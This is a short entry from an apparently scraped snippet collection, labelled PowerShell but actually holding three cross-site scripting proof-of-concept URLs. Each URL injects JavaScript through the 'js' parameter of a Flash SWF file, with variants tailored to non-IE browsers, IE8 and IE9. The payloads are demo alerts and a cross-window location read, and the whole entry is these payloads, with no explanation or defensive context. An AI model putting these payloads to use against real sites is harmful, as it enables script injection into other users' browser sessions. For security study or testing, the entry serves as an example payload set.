---
id: 83db15d4-2dcd-4540-b00e-dee36b363bb8
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:42.100990+00:00'
updated_at: '2023-04-10T20:21:40.582394+00:00'
---

# Code Snippet 83db15d4

**Language**: Powershell

```powershell
Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
```
